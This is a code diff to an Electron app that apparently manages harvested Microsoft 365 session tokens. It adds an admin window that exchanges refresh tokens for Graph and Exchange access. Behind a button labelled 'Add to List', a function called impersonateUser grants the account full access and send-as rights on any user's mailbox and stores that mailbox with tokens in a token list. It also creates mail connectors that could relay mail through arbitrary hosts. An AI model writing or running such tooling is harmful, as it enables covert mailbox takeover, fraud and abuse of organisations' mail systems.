@@ -1325,9 +1325,10 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
       }
     });
 
-    // For Azure/Entra/M365 Admin, launch directly in Chrome (real browser handles
+    // For Azure/Entra, launch directly in Chrome (real browser handles
     // portal extensions properly). The in-app window stays hidden as the token manager.
-    const chromeOnlyServices = ['azure', 'entra', 'm365admin'];
+    // M365 Admin uses custom admin window (handled earlier in IPC handler).
+    const chromeOnlyServices = ['azure', 'entra'];
     if (chromeOnlyServices.includes(service)) {
       portalWindow.loadURL('about:blank');
       portalWindow.minimize();
@@ -1343,6 +1344,489 @@ async function launchChromeWithSession(account: SyncedAccount, service: string):
     const message = error instanceof Error ? error.message : 'Failed to launch browser session';
     return { success: false, error: message };
   }
+}
+
+// ─────────────────────────────────────────────
+// CUSTOM ADMIN WINDOW (Graph API + Exchange Admin API based — like v10.10)
+// ─────────────────────────────────────────────
+const adminWindows = new Map<string, BrowserWindow>();
+
+async function createAdminWindow(account: SyncedAccount): Promise<{ success: boolean; error?: string }> {
+  const email = account.email;
+
+  // Reuse existing admin window if open
+  const existing = adminWindows.get(email);
+  if (existing && !existing.isDestroyed()) {
+    existing.focus();
+    return { success: true };
+  }
+
+  // Exchange tokens for Graph + Exchange scopes
+  let graphToken = account.accessToken;
+  let exchangeToken = account.accessToken;
+  const refreshTk = account.refreshToken;
+  let tid = '';
+
+  try {
+    const gResult = await exchangeTokenWithFallback(refreshTk, 'https://graph.microsoft.com/.default openid profile offline_access');
+    if (!gResult.error && gResult.access_token) {
+      graphToken = gResult.access_token as string;
+      if (gResult.refresh_token) account.refreshToken = gResult.refresh_token as string;
+    }
+  } catch {}
+
+  try {
+    const eResult = await exchangeTokenWithFallback(refreshTk, 'https://outlook.office365.com/.default openid profile offline_access');
+    if (!eResult.error && eResult.access_token) {
+      exchangeToken = eResult.access_token as string;
+      if (eResult.refresh_token) account.refreshToken = eResult.refresh_token as string;
+    }
+  } catch {}
+
+  // Extract tenant ID from token
+  const decoded = decodeJwt(graphToken);
+  tid = (decoded?.tid as string) || '';
+
+  // Build admin HTML
+  const adminHtml = buildAdminHtml(email, graphToken, exchangeToken, refreshTk, account.accessToken, tid);
+
+  const win = new BrowserWindow({
+    width: 1400,
+    height: 900,
+    webPreferences: { nodeIntegration: true, contextIsolation: false, sandbox: false },
+    title: `${email} — Admin Center`,
+    backgroundColor: '#1e1e1e',
+  });
+
+  adminWindows.set(email, win);
+  win.on('closed', () => { adminWindows.delete(email); });
+
+  win.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(adminHtml));
+  return { success: true };
+}
+
+function buildAdminHtml(email: string, graphToken: string, exchangeToken: string, refreshToken: string, accessToken: string, tenantId: string): string {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>${email} - Admin</title>
+<style>
+:root { --bg: #1e1e1e; --surface: #252526; --border: #3e3e42; --text: #cccccc; --text-dim: #858585; --accent: #0078d4; --hover: #2a2d2e; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: 'Segoe UI', sans-serif; background:var(--bg); color:var(--text); height:100vh; display:flex; flex-direction:column; font-size:13px; }
+.tabs { display:flex; background:var(--surface); border-bottom:1px solid var(--border); }
+.tab { padding:10px 20px; cursor:pointer; border-bottom:2px solid transparent; color:var(--text-dim); font-size:13px; transition: all .15s; }
+.tab:hover { color:var(--text); background:var(--hover); }
+.tab.active { color:var(--accent); border-bottom-color:var(--accent); }
+.toolbar { padding:8px 12px; background:var(--surface); border-bottom:1px solid var(--border); display:flex; align-items:center; gap:8px; }
+.toolbar input { background:var(--bg); border:1px solid var(--border); border-radius:3px; padding:4px 8px; color:var(--text); font-size:12px; width:220px; outline:none; }
+.toolbar input:focus { border-color:var(--accent); }
+.toolbar .info { color:var(--text-dim); font-size:11px; margin-left:auto; }
+.content { flex:1; overflow-y:auto; padding:0; }
+table { width:100%; border-collapse:collapse; }
+th { position:sticky; top:0; background:var(--surface); color:var(--text-dim); font-size:11px; text-transform:uppercase; letter-spacing:.5px; padding:6px 12px; text-align:left; border-bottom:1px solid var(--border); z-index:1; }
+td { padding:6px 12px; border-bottom:1px solid rgba(62,62,66,.3); font-size:12px; }
+tr:hover td { background:var(--hover); }
+.status { padding:4px 12px; background:var(--surface); border-top:1px solid var(--border); font-size:11px; color:var(--text-dim); }
+.loading { padding:40px; text-align:center; color:var(--text-dim); }
+.badge { display:inline-block; padding:1px 6px; border-radius:3px; font-size:10px; font-weight:600; }
+.badge-green { background:rgba(35,134,54,.2); color:#3fb950; }
+.badge-red { background:rgba(218,54,51,.2); color:#da3633; }
+.badge-blue { background:rgba(88,166,255,.15); color:#58a6ff; }
+.badge-yellow { background:rgba(210,153,34,.2); color:#d29922; }
+.badge-purple { background:rgba(137,87,229,.2); color:#bc8cff; }
+.license-bar { width:100px; height:6px; background:var(--border); border-radius:3px; display:inline-block; vertical-align:middle; margin-left:8px; }
+.license-bar .fill { height:100%; border-radius:3px; }
+.act-btn { background:none; border:1px solid var(--border); color:var(--text-dim); padding:2px 8px; border-radius:3px; font-size:11px; cursor:pointer; transition: all .15s; }
+.act-btn:hover { background:var(--accent); color:#fff; border-color:var(--accent); }
+.act-btn:disabled { opacity:.4; cursor:not-allowed; }
+</style>
+</head>
+<body>
+<div class="tabs" id="tabs">
+  <div class="tab active" onclick="switchTab('users')">&#x1F465; Users</div>
+  <div class="tab" onclick="switchTab('groups')">&#x1F4CB; Groups</div>
+  <div class="tab" onclick="switchTab('licenses')">&#x1F4DC; Licenses</div>
+  <div class="tab" onclick="switchTab('domains')">&#x1F310; Domains</div>
+  <div class="tab" onclick="switchTab('connectors')">&#x1F517; Connectors</div>
+</div>
+<div class="toolbar">
+  <input id="search" placeholder="Search..." oninput="filterData()">
+  <span class="info" id="info"></span>
+</div>
+<div class="content" id="content"><div class="loading">Loading...</div></div>
+<div class="status" id="status">${email}</div>
+<script>
+const T=${JSON.stringify(graphToken)};
+const ET=${JSON.stringify(exchangeToken)};
+const RT=${JSON.stringify(refreshToken)};
+const EM=${JSON.stringify(email)};
+const AT=${JSON.stringify(accessToken)};
+const TID=${JSON.stringify(tenantId || '')};
+const A='https://graph.microsoft.com/v1.0';
+const EA='https://outlook.office365.com/adminapi/beta';
+let currentTab='users', allData=[];
+
+async function gf(ep, retries=3){
+  for(let attempt=0; attempt<=retries; attempt++){
+    const r=await fetch(A+ep,{headers:{'Authorization':'Bearer '+T}});
+    if(r.status===429){
+      const wait=Math.min(parseInt(r.headers.get('Retry-After'))||2, 10);
+      document.getElementById('status').textContent='\\u23F3 Rate limited \\u2014 retrying in '+wait+'s...';
+      await new Promise(r=>setTimeout(r, wait*1000));
+      continue;
+    }
+    if(!r.ok) throw new Error(r.status+' '+r.statusText);
+    document.getElementById('status').textContent=EM;
+    return r.json();
+  }
+  throw new Error('429 Too Many Requests');
+}
+
+function switchTab(tab){
+  currentTab=tab;
+  const tabNames=['users','groups','licenses','domains','connectors'];
+  document.querySelectorAll('.tab').forEach((t,i)=>t.classList.toggle('active',tabNames[i]===tab));
+  document.getElementById('search').value='';
+  document.getElementById('content').style.display='';
+  document.querySelector('.toolbar').style.display='';
+  loadTab(tab);
+}
+
+async function loadTab(tab){
+  const c=document.getElementById('content');
+  c.innerHTML='<div class="loading">Loading...</div>';
+  try{
+    if(tab==='users'){
+      let users=[],url='/users?$top=100&$select=displayName,mail,userPrincipalName,accountEnabled,createdDateTime,assignedLicenses,userType,id&$orderby=displayName';
+      while(url){const d=await gf(url);users=users.concat(d.value||[]);url=d['@odata.nextLink']?d['@odata.nextLink'].replace(A,''):null;}
+      allData=users; renderUsers(users);
+    } else if(tab==='groups'){
+      let groups=[],url='/groups?$top=100&$select=displayName,mail,groupTypes,membershipRule,createdDateTime,description&$count=true&$orderby=displayName';
+      while(url){const d=await gf(url);groups=groups.concat(d.value||[]);url=d['@odata.nextLink']?d['@odata.nextLink'].replace(A,''):null;}
+      allData=groups; renderGroups(groups);
+    } else if(tab==='licenses'){
+      const d=await gf('/subscribedSkus'); allData=d.value||[]; renderLicenses(allData);
+    } else if(tab==='domains'){
+      const d=await gf('/domains'); allData=d.value||[]; renderDomains(allData);
+    } else if(tab==='connectors'){
+      allData=[]; await renderConnectors();
+    }
+  }catch(e){ c.innerHTML='<div class="loading" style="color:#da3633">Error: '+e.message+'</div>'; }
+}
+
+function renderUsers(list){
+  document.getElementById('info').textContent=list.length+' users';
+  document.getElementById('content').innerHTML='<table><thead><tr><th>Name</th><th>Email</th><th>Type</th><th>Status</th><th>Licenses</th><th>Created</th><th>Actions</th></tr></thead><tbody>'+
+    list.map(u=>'<tr><td>'+(u.displayName||'\\u2014')+'</td><td>'+(u.mail||u.userPrincipalName||'\\u2014')+'</td><td>'+(u.userType||'Member')+'</td><td>'+
+    (u.accountEnabled?'<span class="badge badge-green">Enabled</span>':'<span class="badge badge-red">Disabled</span>')+
+    '</td><td>'+((u.assignedLicenses||[]).length||'0')+'</td><td>'+fmtDt(u.createdDateTime)+'</td><td>'+
+    '<button class="act-btn" onclick="impersonateUser(&apos;'+u.id+'&apos;,&apos;'+esc(u.displayName||u.mail||'')+'&apos;,&apos;'+(u.mail||u.userPrincipalName||'')+'&apos;)">\\u{1F4E7} Add to List</button>'+
+    '</td></tr>').join('')+'</tbody></table>';
+}
+
+function renderGroups(list){
+  document.getElementById('info').textContent=list.length+' groups';
+  document.getElementById('content').innerHTML='<table><thead><tr><th>Name</th><th>Email</th><th>Type</th><th>Description</th><th>Created</th></tr></thead><tbody>'+
+    list.map(g=>{
+      const types=g.groupTypes||[];
+      const type=types.includes('Unified')?'Microsoft 365':types.includes('DynamicMembership')?'Dynamic':'Security';
+      return '<tr><td>'+(g.displayName||'\\u2014')+'</td><td>'+(g.mail||'\\u2014')+'</td><td><span class="badge badge-blue">'+type+'</span></td><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+(g.description||'\\u2014')+'</td><td>'+fmtDt(g.createdDateTime)+'</td></tr>';
+    }).join('')+'</tbody></table>';
+}
+
+function renderLicenses(list){
+  document.getElementById('info').textContent=list.length+' subscriptions';
+  document.getElementById('content').innerHTML='<table><thead><tr><th>License</th><th>SKU</th><th>Used / Total</th><th>Usage</th></tr></thead><tbody>'+
+    list.map(l=>{
+      const total=l.prepaidUnits?(l.prepaidUnits.enabled||0):0;
+      const used=l.consumedUnits||0;
+      const pct=total>0?Math.round(used/total*100):0;
+      const color=pct>90?'#da3633':pct>70?'#d29922':'#3fb950';
+      return '<tr><td>'+(l.skuPartNumber||'\\u2014')+'</td><td style="font-size:10px;color:var(--text-dim)">'+(l.skuId||'')+'</td><td>'+used+' / '+total+'</td><td><div class="license-bar"><div class="fill" style="width:'+pct+'%;background:'+color+'"></div></div> '+pct+'%</td></tr>';
+    }).join('')+'</tbody></table>';
+}
+
+function renderDomains(list){
+  document.getElementById('info').textContent=list.length+' domains';
+  document.getElementById('content').innerHTML='<table><thead><tr><th>Domain</th><th>Default</th><th>Verified</th><th>Type</th></tr></thead><tbody>'+
+    list.map(d=>'<tr><td>'+(d.id||'\\u2014')+'</td><td>'+(d.isDefault?'<span class="badge badge-yellow">Default</span>':'\\u2014')+'</td><td>'+
+    (d.isVerified?'<span class="badge badge-green">Verified</span>':'<span class="badge badge-red">Unverified</span>')+
+    '</td><td>'+((d.authenticationType||'managed'))+'</td></tr>').join('')+'</tbody></table>';
+}
+
+async function renderConnectors(){
+  const c=document.getElementById('content');
+  c.innerHTML='<div class="loading">Loading connectors...</div>';
+  const orgDomain=EM.split('@')[1]||'';
+  if(!ET||ET==='null'||ET==='undefined'){
+    c.innerHTML='<div class="loading" style="color:#da3633">No Exchange token available<br><small style="color:var(--text-dim)">Token exchange may have failed. Close and reopen Admin panel.</small></div>';
+    return;
+  }
+  try{
+    const [inResp, outResp]=await Promise.all([
+      fetch(EA+'/'+orgDomain+'/InboundConnector',{headers:{'Authorization':'Bearer '+ET}}).catch(e=>{console.log('Inbound fetch error:',e.message);return null;}),
+      fetch(EA+'/'+orgDomain+'/OutboundConnector',{headers:{'Authorization':'Bearer '+ET}}).catch(e=>{console.log('Outbound fetch error:',e.message);return null;})
+    ]);
+    let inbound=[],outbound=[];
+    if(inResp&&inResp.ok){const d=await inResp.json();inbound=d.value||d||[];}
+    else if(inResp){console.log('Inbound error: '+inResp.status+' '+inResp.statusText);}
+    if(outResp&&outResp.ok){const d=await outResp.json();outbound=d.value||d||[];}
+    else if(outResp){console.log('Outbound error: '+outResp.status+' '+outResp.statusText);}
+    allData={inbound,outbound};
+    document.getElementById('info').textContent=inbound.length+' inbound, '+outbound.length+' outbound';
+    window._connectors={inbound,outbound};
+    let html='<div style="padding:16px">';
+    html+='<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><h3 style="color:var(--accent);margin:0">\\u{1F4E5} Inbound Connectors</h3>';
+    html+='<button class="act-btn" onclick="showNewConnectorForm(\\'inbound\\')">+ New Inbound</button></div>';
+    if(inbound.length){
+      html+='<table><thead><tr><th>Name</th><th>Status</th><th>Sender Domains</th><th>Sender IPs</th><th>TLS</th><th>Actions</th></tr></thead><tbody>';
+      for(let i=0;i<inbound.length;i++){
+        const cn=inbound[i];
+        const cid=cn.Identity||cn.Id||cn.id||'';
+        const cen=cn.Enabled!==false;
+        html+='<tr><td>'+(cn.Name||cn.name||'\\u2014')+'</td><td>'+(cen?'<span class="badge badge-green">Enabled</span>':'<span class="badge badge-red">Disabled</span>')+'</td>';
+        html+='<td>'+((cn.SenderDomains||cn.senderDomains||[]).map(d=>typeof d==='string'?d:(d.Name||d.name||d)).join(', ')||'*')+'</td>';
+        html+='<td>'+((cn.SenderIPAddresses||cn.senderIPAddresses||[]).join(', ')||'\\u2014')+'</td>';
+        html+='<td>'+(cn.RequireTls||cn.requireTls?'<span class="badge badge-green">Yes</span>':'No')+'</td>';
+        html+='<td style="white-space:nowrap"><button class="act-btn" style="font-size:10px;padding:2px 7px" onclick="editConnector(\\'inbound\\','+i+')">\\u270F</button> <button class="act-btn" style="font-size:10px;padding:2px 7px" onclick="toggleConnector(\\'inbound\\',\\''+cid+'\\','+(! cen)+')">'+(cen?'\\u23F8':'\\u25B6')+'</button> <button class="act-btn" style="font-size:10px;padding:2px 7px;color:#da3633;border-color:#da3633" onclick="deleteConnector(\\'inbound\\',\\''+cid+'\\')">\\u{1F5D1}</button></td></tr>';
+      }
+      html+='</tbody></table>';
+    } else html+='<div style="color:var(--text-dim);padding:8px 0">No inbound connectors configured</div>';
+    html+='<div style="display:flex;align-items:center;gap:8px;margin:20px 0 8px"><h3 style="color:var(--accent);margin:0">\\u{1F4E4} Outbound Connectors</h3>';
+    html+='<button class="act-btn" onclick="showNewConnectorForm(\\'outbound\\')">+ New Outbound</button></div>';
+    if(outbound.length){
+      html+='<table><thead><tr><th>Name</th><th>Status</th><th>Smart Hosts</th><th>Recipient Domains</th><th>TLS</th><th>Actions</th></tr></thead><tbody>';
+      for(let i=0;i<outbound.length;i++){
+        const cn=outbound[i];
+        const cid=cn.Identity||cn.Id||cn.id||'';
+        const cen=cn.Enabled!==false;
+        html+='<tr><td>'+(cn.Name||cn.name||'\\u2014')+'</td><td>'+(cen?'<span class="badge badge-green">Enabled</span>':'<span class="badge badge-red">Disabled</span>')+'</td>';
+        html+='<td>'+((cn.SmartHosts||cn.smartHosts||[]).join(', ')||'\\u2014')+'</td>';
+        html+='<td>'+((cn.RecipientDomains||cn.recipientDomains||[]).map(d=>typeof d==='string'?d:(d.Name||d.name||d)).join(', ')||'*')+'</td>';
+        html+='<td>'+(cn.TlsSettings||cn.tlsSettings||'\\u2014')+'</td>';
+        html+='<td style="white-space:nowrap"><button class="act-btn" style="font-size:10px;padding:2px 7px" onclick="editConnector(\\'outbound\\','+i+')">\\u270F</button> <button class="act-btn" style="font-size:10px;padding:2px 7px" onclick="toggleConnector(\\'outbound\\',\\''+cid+'\\','+(! cen)+')">'+(cen?'\\u23F8':'\\u25B6')+'</button> <button class="act-btn" style="font-size:10px;padding:2px 7px;color:#da3633;border-color:#da3633" onclick="deleteConnector(\\'outbound\\',\\''+cid+'\\')">\\u{1F5D1}</button></td></tr>';
+      }
+      html+='</tbody></table>';
+    } else html+='<div style="color:var(--text-dim);padding:8px 0">No outbound connectors configured</div>';
+    html+='<div id="newConnectorForm"></div>';
+    html+='</div>';
+    c.innerHTML=html;
+  }catch(e){
+    c.innerHTML='<div class="loading" style="color:#da3633">Error: '+e.message+'<br><small style="color:var(--text-dim)">Exchange Admin API requires admin privileges</small></div>';
+  }
+}
+
+async function toggleConnector(type,id,enable){
+  const orgDomain=EM.split('@')[1]||'';
+  const epType=type==='inbound'?'InboundConnector':'OutboundConnector';
+  document.getElementById('status').textContent=(enable?'Enabling':'Disabling')+' connector...';
+  try{
+    const r=await fetch(EA+'/'+orgDomain+'/'+epType+'('+JSON.stringify(id)+')',{method:'PATCH',headers:{'Authorization':'Bearer '+ET,'Content-Type':'application/json'},body:JSON.stringify({Enabled:enable})});
+    if(!r.ok){const e=await r.text();throw new Error(r.status+': '+e.substring(0,200));}
+    document.getElementById('status').textContent=EM;
+    await renderConnectors();
+  }catch(e){document.getElementById('status').textContent='\\u274C '+e.message;setTimeout(()=>{document.getElementById('status').textContent=EM},3000);}
+}
+
+async function deleteConnector(type,id){
+  if(!confirm('Delete this connector?'))return;
+  const orgDomain=EM.split('@')[1]||'';
+  const epType=type==='inbound'?'InboundConnector':'OutboundConnector';
+  document.getElementById('status').textContent='Deleting connector...';
+  try{
+    const r=await fetch(EA+'/'+orgDomain+'/'+epType+'('+JSON.stringify(id)+')',{method:'DELETE',headers:{'Authorization':'Bearer '+ET}});
+    if(!r.ok&&r.status!==204){const e=await r.text();throw new Error(r.status+': '+e.substring(0,200));}
+    document.getElementById('status').textContent=EM;
+    await renderConnectors();
+  }catch(e){document.getElementById('status').textContent='\\u274C '+e.message;setTimeout(()=>{document.getElementById('status').textContent=EM},3000);}
+}
+
+function editConnector(type,idx){
+  const cn=window._connectors[type][idx];
+  if(!cn)return;
+  const cid=cn.Identity||cn.Id||cn.id||'';
+  const isIn=type==='inbound';
+  const f=document.getElementById('newConnectorForm');
+  if(!f)return;
+  let h='<div style="margin-top:20px;padding:16px;background:var(--surface);border:1px solid var(--border);border-radius:6px">';
+  h+='<h3 style="color:var(--accent);margin-bottom:12px">Edit '+(cn.Name||cn.name||'Connector')+'</h3>';
+  h+='<div style="display:grid;grid-template-columns:120px 1fr;gap:8px;align-items:center">';
+  h+='<label>Name:</label><input id="ed-name" value="'+(cn.Name||cn.name||'')+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  if(isIn){
+    h+='<label>Sender IPs:</label><input id="ed-ips" value="'+((cn.SenderIPAddresses||cn.senderIPAddresses||[]).join(', '))+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+    h+='<label>Sender Domains:</label><input id="ed-domains" value="'+((cn.SenderDomains||cn.senderDomains||[]).map(d=>typeof d==='string'?d:(d.Name||d.name||d)).join(', '))+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  } else {
+    h+='<label>Smart Hosts:</label><input id="ed-hosts" value="'+((cn.SmartHosts||cn.smartHosts||[]).join(', '))+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+    h+='<label>Recipient Domains:</label><input id="ed-rdomains" value="'+((cn.RecipientDomains||cn.recipientDomains||[]).map(d=>typeof d==='string'?d:(d.Name||d.name||d)).join(', '))+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  }
+  h+='<label>Require TLS:</label><select id="ed-tls" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px"><option value="true"'+(cn.RequireTls||cn.requireTls||cn.TlsSettings?' selected':'')+'>Yes</option><option value="false"'+(!cn.RequireTls&&!cn.requireTls&&!cn.TlsSettings?' selected':'')+'>No</option></select>';
+  h+='</div>';
+  h+='<input type="hidden" id="ed-type" value="'+type+'">';
+  h+='<input type="hidden" id="ed-id" value="'+cid+'">';
+  h+='<div style="margin-top:12px;display:flex;gap:8px">';
+  h+='<button class="act-btn" style="background:var(--accent);color:#fff;border-color:var(--accent);padding:6px 16px" onclick="saveConnectorEdit()">Save</button>';
+  h+='<button class="act-btn" onclick="document.getElementById(\\'newConnectorForm\\').innerHTML=\\'\\';">Cancel</button>';
+  h+='</div></div>';
+  f.innerHTML=h;
+}
+
+async function saveConnectorEdit(){
+  const type=document.getElementById('ed-type')?.value;
+  const id=document.getElementById('ed-id')?.value;
+  const orgDomain=EM.split('@')[1]||'';
+  const epType=type==='inbound'?'InboundConnector':'OutboundConnector';
+  const name=document.getElementById('ed-name')?.value;
+  const tls=document.getElementById('ed-tls')?.value==='true';
+  let body={Name:name};
+  if(type==='inbound'){
+    body.SenderIPAddresses=(document.getElementById('ed-ips')?.value||'').split(',').map(s=>s.trim()).filter(Boolean);
+    body.SenderDomains=(document.getElementById('ed-domains')?.value||'*').split(',').map(s=>s.trim()).filter(Boolean);
+    body.RequireTls=tls;
+  } else {
+    body.SmartHosts=(document.getElementById('ed-hosts')?.value||'').split(',').map(s=>s.trim()).filter(Boolean);
+    body.RecipientDomains=(document.getElementById('ed-rdomains')?.value||'*').split(',').map(s=>s.trim()).filter(Boolean);
+    body.TlsSettings=tls?'EncryptionOnly':'';
+  }
+  document.getElementById('status').textContent='Saving...';
+  try{
+    const r=await fetch(EA+'/'+orgDomain+'/'+epType+'('+JSON.stringify(id)+')',{method:'PATCH',headers:{'Authorization':'Bearer '+ET,'Content-Type':'application/json'},body:JSON.stringify(body)});
+    if(!r.ok){const e=await r.text();throw new Error(r.status+': '+e.substring(0,200));}
+    document.getElementById('status').textContent=EM;
+    document.getElementById('newConnectorForm').innerHTML='<div style="color:#3fb950;padding:8px">\\u2705 Saved!</div>';
+    setTimeout(()=>renderConnectors(),1000);
+  }catch(e){
+    document.getElementById('status').textContent=EM;
+    document.getElementById('newConnectorForm').innerHTML='<div style="color:#da3633;padding:8px">\\u274C '+e.message+'</div>';
+  }
+}
+
+function showNewConnectorForm(type){
+  const f=document.getElementById('newConnectorForm');
+  if(!f)return;
+  const isInbound=type==='inbound';
+  let h='<div style="margin-top:20px;padding:16px;background:var(--surface);border:1px solid var(--border);border-radius:6px">';
+  h+='<h3 style="color:var(--accent);margin-bottom:12px">New '+(isInbound?'Inbound':'Outbound')+' Connector</h3>';
+  h+='<div style="display:grid;grid-template-columns:120px 1fr;gap:8px;align-items:center">';
+  h+='<label>Name:</label><input id="cn-name" value="Custom '+(isInbound?'Inbound':'Outbound')+'" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  if(isInbound){
+    h+='<label>Sender IPs:</label><input id="cn-ips" placeholder="1.2.3.4, 5.6.7.8" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+    h+='<label>Sender Domains:</label><input id="cn-domains" value="smtp:*;1" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  } else {
+    h+='<label>Smart Hosts:</label><input id="cn-hosts" placeholder="mail.example.com" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+    h+='<label>Recipient Domains:</label><input id="cn-rdomains" value="*" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px">';
+  }
+  h+='<label>Require TLS:</label><select id="cn-tls" style="background:var(--bg);border:1px solid var(--border);color:var(--text);padding:4px 8px;border-radius:3px"><option value="false">No</option><option value="true">Yes</option></select>';
+  h+='</div>';
+  h+='<input type="hidden" id="cn-type" value="'+type+'">';
+  h+='<div style="margin-top:12px;display:flex;gap:8px">';
+  h+='<button class="act-btn" style="background:var(--accent);color:#fff;border-color:var(--accent);padding:6px 16px" onclick="createNewConnector()">Create</button>';
+  h+='<button class="act-btn" onclick="document.getElementById(\\'newConnectorForm\\').innerHTML=\\'\\';">Cancel</button>';
+  h+='</div></div>';
+  f.innerHTML=h;
+}
+
+async function createNewConnector(){
+  const type=document.getElementById('cn-type')?.value;
+  const orgDomain=EM.split('@')[1]||'';
+  const epType=type==='inbound'?'InboundConnector':'OutboundConnector';
+  const name=document.getElementById('cn-name')?.value||'Custom Connector';
+  const tls=document.getElementById('cn-tls')?.value==='true';
+  let body={Name:name,Enabled:true};
+  if(type==='inbound'){
+    body.ConnectorType='OnPremises';
+    body.SenderIPAddresses=(document.getElementById('cn-ips')?.value||'').split(',').map(s=>s.trim()).filter(Boolean);
+    body.SenderDomains=(document.getElementById('cn-domains')?.value||'smtp:*;1').split(',').map(s=>s.trim()).filter(Boolean);
+    body.RequireTls=tls;
+    body.RestrictDomainsToIPAddresses=true;
+  } else {
+    body.ConnectorType='OnPremises';
+    body.SmartHosts=(document.getElementById('cn-hosts')?.value||'').split(',').map(s=>s.trim()).filter(Boolean);
+    body.RecipientDomains=(document.getElementById('cn-rdomains')?.value||'*').split(',').map(s=>s.trim()).filter(Boolean);
+    body.TlsSettings=tls?'EncryptionOnly':'';
+    body.UseMXRecord=false;
+    body.IsTransportRuleScoped=false;
+  }
+  document.getElementById('status').textContent='Creating connector...';
+  try{
+    const r=await fetch(EA+'/'+orgDomain+'/'+epType,{method:'POST',headers:{'Authorization':'Bearer '+ET,'Content-Type':'application/json'},body:JSON.stringify(body)});
+    if(!r.ok){const e=await r.text();throw new Error(r.status+': '+e.substring(0,200));}
+    document.getElementById('status').textContent=EM;
+    document.getElementById('newConnectorForm').innerHTML='<div style="color:#3fb950;padding:8px">\\u2705 Connector created!</div>';
+    setTimeout(()=>renderConnectors(),1000);
+  }catch(e){
+    document.getElementById('status').textContent=EM;
+    document.getElementById('newConnectorForm').innerHTML='<div style="color:#da3633;padding:8px">\\u274C '+e.message+'</div>';
+  }
+}
+
+async function impersonateUser(userId, displayName, userEmail){
+  const orgDomain=EM.split('@')[1]||'';
+  const statusEl=document.getElementById('status');
+  statusEl.textContent='Adding mailbox permissions for '+displayName+'...';
+  const permHeaders={'Authorization':'Bearer '+ET,'Content-Type':'application/json'};
+  const permResults=await Promise.allSettled([
+    fetch(EA+'/'+orgDomain+'/InvokeCommand',{
+      method:'POST', headers:permHeaders,
+      body:JSON.stringify({CmdletInput:{CmdletName:'Add-MailboxPermission',Parameters:{Identity:userEmail,User:EM,AccessRights:'FullAccess',AutoMapping:true}}})
+    }).then(r=>r.text().then(txt=>({name:'FullAccess',ok:r.ok,status:r.status,txt}))),
+    fetch(EA+'/'+orgDomain+'/InvokeCommand',{
+      method:'POST', headers:permHeaders,
+      body:JSON.stringify({CmdletInput:{CmdletName:'Add-RecipientPermission',Parameters:{Identity:userEmail,Trustee:EM,AccessRights:'SendAs',Confirm:false}}})
+    }).then(r=>r.text().then(txt=>({name:'SendAs',ok:r.ok,status:r.status,txt}))),
+    fetch(EA+'/'+orgDomain+'/InvokeCommand',{
+      method:'POST', headers:permHeaders,
+      body:JSON.stringify({CmdletInput:{CmdletName:'Set-Mailbox',Parameters:{Identity:userEmail,GrantSendOnBehalfTo:EM}}})
+    }).then(r=>r.text().then(txt=>({name:'SendOnBehalf',ok:r.ok,status:r.status,txt}))),
+  ]);
+  const granted=[],failed=[];
+  for(const r of permResults){
+    if(r.status==='fulfilled'){
+      const v=r.value;
+      if(v.ok||v.txt.includes('already')||v.txt.includes('existing')||v.status===409){granted.push(v.name);}
+      else{failed.push(v.name+'('+v.status+')');console.log(v.name+' error: '+v.status+' '+v.txt.substring(0,200));}
+    }else{failed.push('unknown');console.log('Permission error:',r.reason);}
+  }
+  if(granted.length>0){statusEl.textContent='\\u2705 '+granted.join(', ')+' granted on '+userEmail+' \\u2014 opening mailbox...';}
+  else{statusEl.textContent='\\u26A0\\uFE0F Permissions failed \\u2014 trying anyway...';}
+  if(failed.length>0) console.log('Failed permissions: '+failed.join(', '));
+  const ipc = require('electron').ipcRenderer;
+  ipc.send('add-to-list', {
+    email: userEmail,
+    displayName: displayName || userEmail,
+    token: AT,
+    refreshToken: RT,
+    tokenId: TID,
+    adminEmail: EM,
+    portalUrl: 'https://outlook.office365.com/mail/' + userEmail + '/'
+  });
+  statusEl.textContent='\\u2705 ' + userEmail + ' added to token list';
+}
+
+function fmtDt(d){if(!d)return '\\u2014';const x=new Date(d);return x.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});}
+function esc(s){return s.replace(/'/g,"\\\\'").replace(/"/g,'&quot;');}
+
+function filterData(){
+  const q=document.getElementById('search').value.toLowerCase();
+  if(!q){
+    if(currentTab==='users')renderUsers(allData);
+    else if(currentTab==='groups')renderGroups(allData);
+    else if(currentTab==='licenses')renderLicenses(allData);
+    else if(currentTab==='domains')renderDomains(allData);
+    return;
+  }
+  const f=allData.filter(item=>JSON.stringify(item).toLowerCase().includes(q));
+  if(currentTab==='users')renderUsers(f);
+  else if(currentTab==='groups')renderGroups(f);
+  else if(currentTab==='licenses')renderLicenses(f);
+  else if(currentTab==='domains')renderDomains(f);
+}
+
+loadTab('users');
+<\/script>
+</body>
+</html>`;
 }
 
 function findChromePath(): string {
@@ -1750,8 +2234,37 @@ function setupIpcHandlers(): void {
       return await launchExternalChrome(account, service);
     }
 
+    // M365 Admin / Admin → custom admin window (Graph API + Exchange Admin API)
+    if (service === 'm365admin' || service === 'admin') {
+      return await createAdminWindow(account);
+    }
+
     // Launch in-app browser window with token injection
     return await launchChromeWithSession(account, service);
+  });
+
+  // Add to List (from Admin window — delegated mailbox access)
